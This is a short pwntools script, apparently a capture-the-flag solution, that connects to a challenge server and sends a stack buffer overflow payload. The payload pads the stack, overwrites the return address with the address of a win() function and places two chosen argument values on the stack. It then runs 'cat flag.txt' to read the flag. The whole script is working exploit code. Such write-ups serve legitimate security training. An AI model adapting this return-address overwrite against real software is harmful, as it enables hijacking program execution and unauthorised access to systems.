from pwn import *

p = remote("challs.pwnoh.io", 13402)

payload = b'A' * 28        # padding up to eip
payload += p32(0x08049206) # addr of win()
payload += p32(0x0)        # ret addr
payload += p32(0xc0ffee)   # replace arg check on stack
payload += p32(0x007ab1e)  # replace arg mate on stack

p.clean() 
p.sendline(payload)

log.info(p.clean())

p.sendline("cat flag.txt".encode())
log.info(p.clean())

p.close()
